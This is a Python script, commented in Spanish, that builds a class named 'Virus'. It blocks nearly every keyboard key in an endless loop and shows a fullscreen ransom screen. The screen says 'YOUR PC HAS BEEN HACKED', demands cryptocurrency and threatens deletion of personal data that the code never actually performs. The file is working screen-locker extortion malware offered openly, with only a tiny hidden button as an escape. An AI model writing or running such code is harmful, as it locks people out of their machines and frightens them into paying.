# lo primero es importar las librerias que se necesitan

from tkinter import *
import keyboard
import time


# luego se hace  una lista con los nombres de todas las teclas para luego poder
# bloquear las pulsaciones de todas las teclas


keys_2 = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '`', '~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '=', '[', ']', '\\', ';', '\'', ',', '.', '/',
    '<', '>', '?',
    '+',
    'Shift', 'Ctrl', 'Alt', 'Win', 'Space', 'Tab', 'CapsLock',
    'Esc', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7',
    'F8', 'F9', 'F10', 'F11', 'F12',
    'Insert', 'Delete', 'Home', 'End',
    'PageUp', 'PageDown',
    'Up', 'Down', 'Left', 'Right', 'windows izquierda'
    ]


# crear la clase
class Virus:

    def __init__(self, texto, texto2):
        self.root = Tk()
        self.label = Label(self.root)
        self.label2 = Label(self.label)
        self.boton = Button(self.label)
        self.texto2 = texto2
        self.texto = texto
        self.letra = ''

    def ventana_virus(self):

        self.root.wm_attributes("-fullscreen", "True")
        self.root.config(bg='red')

        self.label.config(bg='black', text=self.texto, font="'console', 60", foreground='white')
        self.label.place(x=100, y=220, width=1350, height=450)

        self.label2.config(bg='black', text=self.texto2, font="'console', 14", foreground='white',)
        self.label2.place(x=30, y=290, width=1300, height=70)

        self.boton.config(bg='black', command=self.destruir)
        self.boton.place(x=609, y=229, width=5, height=5)

        self.root.mainloop()

    # funcion para destruir o cerrar la ventana
    def destruir(self):

        self.root.withdraw()
        keyboard.unblock_key('windows izquierda')
        time.sleep(5)
        self.root.deiconify()
        keyboard.block_key('windows izquierda')

    # funcion para bloquear el teclado
    def block_word(self):

        # en este bucle infinito se bloqueará el teclado.
        while True:

            # se recorre la lista de teclas
            for key in keys_2:
                # verificamos la tecla cuando pasa por cada una
                if key in keys_2:
                    # se bloquea cada letra
                    keyboard.block_key(key)
            # se abre la interfaz despúes de bloquear todas las teclas
            self.ventana_virus()


# frases que se mostraran en la interfas
frase = "YOUR PC HAS BEEN HACKED"
frase_2 = "IF YOU WANT YOUR PC AGAIN, SEND ME CRYPTOCURRENCY TO THIS ACOUNT" \
          ": >>>KJFH242SIA333GIFGSDD232FGSIFGSYF.\nDO NOT TURN OFF YOUR PC OR ALL PERSONAL INFORMATIO NWILL BE DELETE"


# se instancia la clase de virus y se le pasa como atributo las frases definidas anteriormente
programa = Virus(frase, frase_2)
# se llama el metodo block_word
programa.block_word()
